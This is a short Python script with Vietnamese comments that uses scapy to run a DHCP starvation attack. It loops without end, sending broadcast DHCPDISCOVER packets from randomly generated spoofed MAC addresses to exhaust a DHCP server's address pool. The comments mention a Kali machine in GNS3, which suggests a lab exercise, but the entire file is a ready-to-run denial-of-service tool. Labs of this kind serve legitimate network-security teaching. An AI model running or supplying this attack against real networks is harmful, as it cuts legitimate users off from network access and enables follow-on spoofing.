#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Cần cài đặt thư viện scapy trước: pip install scapy
from scapy.all import *
import random
import time

def generate_random_mac():
    """Hàm này tạo ra một địa chỉ MAC ngẫu nhiên."""
    # Địa chỉ MAC có dạng 6 cặp hex, ví dụ: 00:1A:2B:3C:4D:5E
    mac = [ 0x00, 0x16, 0x3e,
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff) ]
    return ':'.join(map(lambda x: "%02x" % x, mac))

# --- Cấu hình ---
# Thay 'eth0' bằng tên card mạng của máy Kali trong GNS3 của bạn
# Dùng lệnh `ip a` để xem tên chính xác
network_interface = "eth0"
conf.iface = network_interface

print(" Bắt đầu tấn công DHCP Starvation trên interface:", network_interface)
print(" Nhấn Ctrl + C để dừng lại.")
print("=" * 50)

# --- Vòng lặp tấn công ---
try:
    while True:
        # 1. Tạo một địa chỉ MAC giả mạo cho mỗi lần lặp
        client_mac = generate_random_mac()

        # 2. Xây dựng gói tin DHCPDISCOVER từ dưới lên
        # Lớp Ethernet: Gửi từ MAC giả của chúng ta đến địa chỉ broadcast
        ethernet_layer = Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff")

        # Lớp IP: Gửi từ 0.0.0.0 đến địa chỉ broadcast
        ip_layer = IP(src="0.0.0.0", dst="255.255.255.255")

        # Lớp UDP: Gửi từ cổng 68 (client) đến cổng 67 (server)
        udp_layer = UDP(sport=68, dport=67)

        # Lớp BOOTP: Mang địa chỉ MAC của client
        bootp_layer = BOOTP(chaddr=mac2str(client_mac))

        # Lớp DHCP: Đặt tùy chọn để gói tin này là một 'discover'
        dhcp_layer = DHCP(options=[("message-type", "discover"), "end"])
        
        # 3. Kết hợp các lớp lại thành một gói tin hoàn chỉnh
        dhcp_discover_packet = ethernet_layer / ip_layer / udp_layer / bootp_layer / dhcp_layer
        
        # 4. Gửi gói tin ở lớp 2 (Ethernet) mà không cần nhận phản hồi
        sendp(dhcp_discover_packet, iface=network_interface, verbose=0)
        
        print(f" -> Đã gửi DHCPDISCOVER từ MAC: {client_mac}")
        
        # Tạm dừng một chút để tránh làm quá tải CPU
        time.sleep(0.1)

except KeyboardInterrupt:
    print("\n[!] Tấn công đã dừng.")
except Exception as e:
    print(f"\n[!] Đã xảy ra lỗi: {e}")